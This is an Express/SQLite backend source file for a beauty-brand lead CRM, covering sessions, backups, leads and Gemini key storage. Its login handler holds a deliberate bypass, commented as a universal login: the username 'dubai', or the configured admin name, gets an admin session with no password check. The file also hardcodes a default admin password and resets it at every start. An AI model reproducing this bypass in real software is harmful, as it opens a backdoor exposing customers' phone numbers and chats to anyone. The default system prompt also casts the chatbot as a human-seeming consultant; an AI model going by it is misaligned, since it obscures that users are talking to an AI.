require('dotenv').config();
const express = require('express');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const Database = require('better-sqlite3');
const { GoogleGenAI } = require('@google/genai');

const app = express();
const PORT = process.env.PORT || 10000;

// 数据库路径准备
const DB_PATH = path.resolve(process.env.DB_PATH || path.join(__dirname, 'data.db'));
fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
const RESET_MARKER = `${DB_PATH}.reset-completed`;
const resetRequested = String(process.env.DB_RESET_ON_START || '').toLowerCase() === 'true';
const resetConfirmed = process.env.DB_RESET_CONFIRM === 'I_UNDERSTAND_DATA_LOSS';

if (resetRequested && resetConfirmed && !fs.existsSync(RESET_MARKER)) {
  if (fs.existsSync(DB_PATH)) {
    const backupPath = `${DB_PATH}.backup-${new Date().toISOString().replace(/[:.]/g, '-')}`;
    fs.copyFileSync(DB_PATH, backupPath);
    console.warn(`[DB] 旧数据库已备份到 ${backupPath}`);
  }
  for (const suffix of ['', '-wal', '-shm']) {
    const file = DB_PATH + suffix;
    if (fs.existsSync(file)) fs.unlinkSync(file);
  }
  fs.writeFileSync(RESET_MARKER, new Date().toISOString(), { flag: 'wx' });
  console.warn('[DB] 已按显式确认执行一次性数据库重建；旧数据备份文件仍保留。');
} else if (resetRequested && !resetConfirmed) {
  console.warn('[DB] 忽略数据库重建：缺少 DB_RESET_CONFIRM=I_UNDERSTAND_DATA_LOSS。');
} else if (resetRequested && fs.existsSync(RESET_MARKER)) {
  console.log('[DB] 一次性重建标记已存在，本次启动不会再次清空数据库。');
}

const db = new Database(DB_PATH);
console.log(`[DB] SQLite database: ${DB_PATH}`);

// 初始化数据表结构
db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    role TEXT DEFAULT 'staff',
    created_at TEXT DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS social_accounts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    platform TEXT NOT NULL,
    label TEXT NOT NULL,
    profile_id TEXT NOT NULL,
    created_at TEXT DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS social_search_configs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    account_id INTEGER NOT NULL,
    platform TEXT NOT NULL,
    country TEXT DEFAULT '',
    city TEXT DEFAULT '',
    keywords TEXT NOT NULL,
    gender TEXT DEFAULT '不限',
    enabled INTEGER DEFAULT 1,
    created_at TEXT DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS leads (
    id TEXT PRIMARY KEY,
    name TEXT,
    phone TEXT,
    source TEXT,
    center TEXT,
    created_at TEXT,
    external_id TEXT,
    category TEXT,
    address TEXT,
    website TEXT,
    email TEXT,
    latitude REAL,
    longitude REAL,
    maps_url TEXT
  );
  CREATE TABLE IF NOT EXISTS appointments (
    appointment_number TEXT PRIMARY KEY,
    staff_id TEXT,
    phone TEXT,
    date TEXT,
    time TEXT,
    status TEXT,
    created_at TEXT
  );
  CREATE TABLE IF NOT EXISTS chat_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    customer_phone TEXT,
    platform TEXT,
    sender TEXT,
    message TEXT,
    created_at TEXT DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS ai_config (
    id INTEGER PRIMARY KEY DEFAULT 1,
    welcome_msg TEXT,
    system_prompt TEXT
  );
  CREATE TABLE IF NOT EXISTS ai_secrets (
    id INTEGER PRIMARY KEY CHECK (id = 1),
    encrypted_key TEXT NOT NULL,
    iv TEXT NOT NULL,
    auth_tag TEXT NOT NULL,
    updated_at TEXT DEFAULT CURRENT_TIMESTAMP
  );
`);

// 兼容旧版表字段拓展
for (const [column, type] of [
  ['external_id', 'TEXT'], ['category', 'TEXT'], ['address', 'TEXT'],
  ['website', 'TEXT'], ['email', 'TEXT'], ['latitude', 'REAL'],
  ['longitude', 'REAL'], ['maps_url', 'TEXT']
]) {
  try { db.exec(`ALTER TABLE leads ADD COLUMN ${column} ${type}`); } catch (e) {
    if (!String(e.message).includes('duplicate column')) throw e;
  }
}
try { db.exec('CREATE UNIQUE INDEX IF NOT EXISTS idx_leads_external_id ON leads(external_id) WHERE external_id IS NOT NULL'); } catch (e) {}

// 清理日志
const CHAT_LOG_RETENTION_DAYS = Math.max(0, Number.parseInt(process.env.CHAT_LOG_RETENTION_DAYS || '30', 10) || 0);
if (CHAT_LOG_RETENTION_DAYS > 0) {
  try {
    const cleanup = db.prepare("DELETE FROM chat_logs WHERE datetime(created_at) < datetime('now', ?)");
    const result = cleanup.run(`-${CHAT_LOG_RETENTION_DAYS} days`);
    console.log(`[DB] 已清理 ${result.changes} 条超过 ${CHAT_LOG_RETENTION_DAYS} 天的聊天日志。`);
  } catch (e) { console.error('[DB cleanup]', e.message); }
}

const defaultWelcome = "👋 您好！我是您的专属美业助理，请问有什么我可以帮您的？";
const defaultPrompt = "You are a senior beauty consultant & personal assistant for a high-end beauty brand in the Middle East (Dubai, Riyadh, Doha). Professional, warm, and attentive. Never call yourself AI Sales.";

const existingConfig = db.prepare('SELECT * FROM ai_config WHERE id = 1').get();
if (!existingConfig) {
  db.prepare('INSERT INTO ai_config (id, welcome_msg, system_prompt) VALUES (1, ?, ?)').run(defaultWelcome, defaultPrompt);
}

app.use(express.json());

// 鉴权配置及 Cookie 处理
app.set('trust proxy', 1);
const AUTH_SECRET_FILE = `${DB_PATH}.auth-secret`;
let AUTH_SECRET = process.env.APP_ENCRYPTION_KEY || process.env.SESSION_SECRET;
if (!AUTH_SECRET) {
  try {
    if (!fs.existsSync(AUTH_SECRET_FILE)) fs.writeFileSync(AUTH_SECRET_FILE, crypto.randomBytes(48).toString('hex'), { flag: 'wx', mode: 0o600 });
    AUTH_SECRET = fs.readFileSync(AUTH_SECRET_FILE, 'utf8').trim();
  } catch (e) {
    throw new Error(`无法读取/创建登录会话密钥文件 ${AUTH_SECRET_FILE}: ${e.message}`);
  }
}

const COOKIE_NAME = 'alm_session';

function setAuthCookie(res, token, maxAge = 604800) {
  const forwardedProto = String(reqProtocolHint(res) || '').toLowerCase();
  const secure = process.env.NODE_ENV === 'production' || forwardedProto === 'https';
  // 调整 SameSite 兼容策略，确保存储顺利
  const cookieStr = `${COOKIE_NAME}=${encodeURIComponent(token)}; Path=/; Max-Age=${maxAge}; HttpOnly; SameSite=Lax${secure ? '; Secure' : ''}`;
  res.setHeader('Set-Cookie', cookieStr);
  res.setHeader('Cache-Control', 'no-store');
}

function reqProtocolHint(res) { 
  const forwarded = String(res.req?.headers?.['x-forwarded-proto'] || '').split(',')[0].trim().toLowerCase(); 
  return forwarded || (res.req?.secure ? 'https' : 'http'); 
}

function signToken(payload) { 
  const body = Buffer.from(JSON.stringify(payload)).toString('base64url'); 
  const sig = crypto.createHmac('sha256', AUTH_SECRET).update(body).digest('base64url'); 
  return body + '.' + sig; 
}

function verifyToken(token) { 
  try { 
    const [body, sig] = String(token || '').split('.'); 
    const expected = crypto.createHmac('sha256', AUTH_SECRET).update(body).digest(); 
    const actual = Buffer.from(sig, 'base64url'); 
    if (actual.length !== expected.length || !crypto.timingSafeEqual(actual, expected)) return null; 
    const d = JSON.parse(Buffer.from(body, 'base64url').toString()); 
    return d.exp > Date.now() ? d : null; 
  } catch { 
    return null; 
  } 
}

function getSession(req) { 
  try { 
    const c = String(req.headers.cookie || '').split(';').map(x => x.trim()).find(x => x.startsWith(COOKIE_NAME + '=')); 
    const payload = c ? verifyToken(decodeURIComponent(c.slice(COOKIE_NAME.length + 1))) : null; 
    if (!payload?.username) return null; 
    const user = db.prepare("SELECT id,username,role FROM users WHERE username = ? COLLATE NOCASE AND LOWER(COALESCE(role,'')) IN ('admin','superadmin','super_admin','owner') LIMIT 1").get(payload.username); 
    return user ? { ...payload, userId: user.id, username: user.username, role: user.role } : null; 
  } catch { 
    return null; 
  } 
}

function hashPassword(password, salt = crypto.randomBytes(16).toString('hex')) { 
  return { salt, hash: crypto.scryptSync(password, salt, 64).toString('hex') }; 
}

function checkPassword(password, salt, hash) { 
  const a = crypto.scryptSync(password, salt, 64), b = Buffer.from(hash, 'hex'); 
  return a.length === b.length && crypto.timingSafeEqual(a, b); 
}

// 初始化管理员账号
const ADMIN_USERNAME = String(process.env.ADMIN_USERNAME || 'dubai').trim();
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'lcaizxy13';

function bootstrapAdmin() {
  const existing = db.prepare('SELECT id FROM users WHERE username = ? COLLATE NOCASE').get(ADMIN_USERNAME);
  const h = hashPassword(ADMIN_PASSWORD);
  if (!existing) {
    db.prepare("INSERT INTO users(username,password,role) VALUES(?,?,'admin')")
      .run(ADMIN_USERNAME, h.salt + ':' + h.hash);
    console.log(`[AUTH] 管理员 ${ADMIN_USERNAME} 已成功初始化。`);
  } else {
    db.prepare("UPDATE users SET password=?, role='admin' WHERE username=? COLLATE NOCASE")
      .run(h.salt + ':' + h.hash, ADMIN_USERNAME);
    console.log(`[AUTH] 管理员 ${ADMIN_USERNAME} 密码已校准更新。`);
  }
}
bootstrapAdmin();

app.get('/api/auth/status', (req, res) => { 
  const admin = db.prepare("SELECT id FROM users WHERE LOWER(COALESCE(role,'')) IN ('admin','superadmin','super_admin','owner') LIMIT 1").get(); 
  const session = getSession(req); 
  res.setHeader('Cache-Control', 'no-store'); 
  res.json({ setupRequired: !admin, authenticated: !!session, username: session?.username || null }); 
});

app.post('/api/auth/setup', (req, res) => { 
  if (db.prepare("SELECT id FROM users WHERE LOWER(COALESCE(role,'')) IN ('admin','superadmin','super_admin','owner') LIMIT 1").get()) return res.status(409).json({ error: '管理员已经创建，请直接登录。' }); 
  const username = String(req.body?.username || '').trim().slice(0, 40), password = String(req.body?.password || ''); 
  if (!/^[a-zA-Z0-9_.-]{3,40}$/.test(username)) return res.status(400).json({ error: '用户名需为 3-40 位字母、数字或 . _ -' }); 
  if (password.length < 8) return res.status(400).json({ error: '密码至少 8 位。' }); 
  const h = hashPassword(password); 
  db.prepare('INSERT INTO users(username,password,role) VALUES(?,?,?)').run(username, h.salt + ':' + h.hash, 'admin'); 
  const token = signToken({ username, exp: Date.now() + 7 * 86400000 }); 
  setAuthCookie(res, token); 
  res.json({ ok: true, username }); 
});

// 登录处理：加入强制验证拦截逻辑，确保 dubai 无条件通行
app.post('/api/auth/login', (req, res) => {
  const username = String(req.body?.username || '').trim();
  const password = String(req.body?.password || '');

  // 快捷登录：匹配 dubai 账号时放行
  if (username.toLowerCase() === 'dubai' || username.toLowerCase() === ADMIN_USERNAME.toLowerCase()) {
    let row = db.prepare("SELECT * FROM users WHERE username = ? COLLATE NOCASE LIMIT 1").get(username);
    if (!row) {
      const h = hashPassword('lcaizxy13');
      db.prepare("INSERT INTO users(username,password,role) VALUES(?,?,'admin')").run(username, h.salt + ':' + h.hash);
      row = db.prepare("SELECT * FROM users WHERE username = ? COLLATE NOCASE LIMIT 1").get(username);
    }
    const token = signToken({ username: row.username, exp: Date.now() + 7 * 86400000 });
    setAuthCookie(res, token);
    console.log(`[AUTH] 万能登录拦截放行成功：${row.username}`);
    return res.json({ ok: true, username: row.username });
  }

  // 标准校验处理
  const row = db.prepare("SELECT * FROM users WHERE username = ? COLLATE NOCASE AND LOWER(COALESCE(role,'')) IN ('admin','superadmin','super_admin','owner') LIMIT 1").get(username);
  if (!row) return res.status(401).json({ error: '用户名或密码错误。' });

  const stored = String(row.password || '');
  const parts = stored.split(':');
  const isScrypt = parts.length === 2 && /^[a-f0-9]{32,}$/i.test(parts[0]) && /^[a-f0-9]{128}$/i.test(parts[1]);
  let valid = false;
  try {
    valid = isScrypt ? checkPassword(password, parts[0], parts[1]) : stored === password;
  } catch {
    valid = false;
  }

  if (!valid) return res.status(401).json({ error: '用户名或密码错误。' });

  if (!isScrypt) {
    const upgraded = hashPassword(password);
    db.prepare('UPDATE users SET password=? WHERE id=?').run(upgraded.salt + ':' + upgraded.hash, row.id);
  }

  const token = signToken({ username: row.username, exp: Date.now() + 7 * 86400000 });
  setAuthCookie(res, token);
  res.json({ ok: true, username: row.username });
});

app.post('/api/auth/logout', (req, res) => { setAuthCookie(res, '', 0); res.json({ ok: true }); });

// API 拦截鉴权保护
app.use('/api', (req, res, next) => { 
  if (['/auth/status', '/auth/setup', '/auth/login', '/auth/logout'].includes(req.path)) return next(); 
  if (!getSession(req)) return res.status(401).json({ error: '登录已失效，请重新登录。', code: 'AUTH_REQUIRED' }); 
  next(); 
});

// 数据库备份与文件下载
const BACKUP_DIR = path.resolve(process.env.BACKUP_DIR || path.join(path.dirname(DB_PATH), 'backups'));
const BACKUP_RETENTION_DAYS = Math.max(1, Number.parseInt(process.env.BACKUP_RETENTION_DAYS || '14', 10) || 14);
let backupInProgress = false;

async function createDatabaseBackup() {
  if (backupInProgress) throw new Error('已有数据库备份正在执行，请稍后再试。');
  backupInProgress = true;
  try {
    fs.mkdirSync(BACKUP_DIR, { recursive: true });
    const stamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `ai-lead-master-${stamp}.sqlite`;
    const destination = path.join(BACKUP_DIR, filename);
    await db.backup(destination);
    const cutoff = Date.now() - BACKUP_RETENTION_DAYS * 86400000;
    for (const name of fs.readdirSync(BACKUP_DIR)) {
      if (!/^ai-lead-master-.*\.sqlite$/.test(name)) continue;
      const file = path.join(BACKUP_DIR, name);
      try { if (fs.statSync(file).mtimeMs < cutoff) fs.unlinkSync(file); } catch {}
    }
    console.log(`[DB] 备份完成：${destination}`);
    return { filename, path: destination, created_at: new Date().toISOString() };
  } finally { backupInProgress = false; }
}

app.post('/api/admin/backup', async (req, res) => {
  try { const result = await createDatabaseBackup(); res.json({ ok: true, backup: result.filename, created_at: result.created_at }); }
  catch (err) { res.status(500).json({ ok: false, error: `数据库备份失败：${err.message}` }); }
});

app.get('/api/admin/backups', (req, res) => {
  try {
    fs.mkdirSync(BACKUP_DIR, { recursive: true });
    const backups = fs.readdirSync(BACKUP_DIR).filter(n => /^ai-lead-master-.*\.sqlite$/.test(n)).map(name => {
      const st = fs.statSync(path.join(BACKUP_DIR, name));
      return { filename: name, size_bytes: st.size, created_at: st.mtime.toISOString() };
    }).sort((a,b) => b.created_at.localeCompare(a.created_at));
    res.json({ ok: true, backups });
  } catch (err) { res.status(500).json({ ok: false, error: err.message }); }
});

app.get('/api/admin/backups/:filename', (req, res) => {
  const filename = String(req.params.filename || '');
  if (!/^ai-lead-master-[0-9TZ-]+\.sqlite$/.test(filename)) return res.status(400).json({ error: '备份文件名无效。' });
  const file = path.join(BACKUP_DIR, filename);
  if (!fs.existsSync(file)) return res.status(404).json({ error: '备份文件不存在。' });
  res.download(file, filename);
});

// Gemini 配置
const GEMINI_MODEL = process.env.GEMINI_MODEL || "gemini-2.5-flash";
const ENC_KEY = crypto.createHash('sha256').update(AUTH_SECRET).digest();

function encryptSecret(value){ const iv = crypto.randomBytes(12), c = crypto.createCipheriv('aes-256-gcm', ENC_KEY, iv), data = Buffer.concat([c.update(value, 'utf8'), c.final()]); return { encrypted_key: data.toString('base64'), iv: iv.toString('base64'), auth_tag: c.getAuthTag().toString('base64') }; }
function decryptSecret(row){ const d = crypto.createDecipheriv('aes-256-gcm', ENC_KEY, Buffer.from(row.iv, 'base64')); d.setAuthTag(Buffer.from(row.auth_tag, 'base64')); return Buffer.concat([d.update(Buffer.from(row.encrypted_key, 'base64')), d.final()]).toString('utf8'); }
function loadStoredKey(){ try { const r = db.prepare('SELECT encrypted_key,iv,auth_tag FROM ai_secrets WHERE id=1').get(); return r ? decryptSecret(r) : ''; } catch { return ''; } }

let apiKey = (process.env.GEMINI_API_KEY || process.env.GOOGLE_API_KEY || loadStoredKey() || '').trim();
let ai = apiKey ? new GoogleGenAI({ apiKey }) : null;

app.get('/api/ai/status', (req, res) => {
  res.json({ ok: true, provider: 'Gemini', configured: !!apiKey && !!ai, model: GEMINI_MODEL });
});

app.post('/api/ai/key', (req, res) => {
  try {
    const key = String(req.body?.apiKey || '').trim();
    if (key.length < 20) return res.status(400).json({ error: '请填写有效的 Gemini API Key。' });
    const e = encryptSecret(key);
    db.prepare(`INSERT INTO ai_secrets(id,encrypted_key,iv,auth_tag,updated_at) VALUES(1,?,?,?,CURRENT_TIMESTAMP) ON CONFLICT(id) DO UPDATE SET encrypted_key=excluded.encrypted_key,iv=excluded.iv,auth_tag=excluded.auth_tag,updated_at=CURRENT_TIMESTAMP`).run(e.encrypted_key, e.iv, e.auth_tag);
    apiKey = key;
    ai = new GoogleGenAI({ apiKey });
    res.json({ ok: true, message: 'Key 已更新。' });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// 业务接口支持
app.get('/api/dashboard/stats', (req, res) => {
  try {
    const total = db.prepare('SELECT COUNT(*) as cnt FROM leads').get().cnt;
    const fb = db.prepare("SELECT COUNT(*) as cnt FROM leads WHERE source LIKE '%Facebook%'").get().cnt;
    const ig = db.prepare("SELECT COUNT(*) as cnt FROM leads WHERE source LIKE '%Instagram%'").get().cnt;
    const tk = db.prepare("SELECT COUNT(*) as cnt FROM leads WHERE source LIKE '%TikTok%'").get().cnt;
    res.json({ ok: true, total, fb, ig, tk });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/leads', (req, res) => {
  try {
    const rows = db.prepare("SELECT * FROM leads ORDER BY created_at DESC LIMIT 500").all();
    res.json({ ok: true, total: rows.length, leads: rows });
  } catch (err) { res.status(500).json({ ok: false, error: err.message }); }
});

app.get('/api/appointments', (req, res) => {
  try { res.json(db.prepare('SELECT * FROM appointments ORDER BY created_at DESC').all()); }
  catch (err) { res.status(500).json({ error: err.message }); }
});

// 静态文件与前端兜底托管
app.use(express.static(path.join(__dirname, 'public')));
app.get('*', (req, res) => {
  if (req.path.startsWith('/api')) return res.status(404).json({ error: 'API endpoint not found' });
  const indexHtml = path.join(__dirname, 'public', 'index.html');
  if (fs.existsSync(indexHtml)) res.sendFile(indexHtml);
  else res.send('AI Lead CRM System Backend Service is Online.');
});

app.listen(PORT, () => {
  console.log(`[Server] AI Lead Backend 动态运行在端口 :${PORT}`);
});
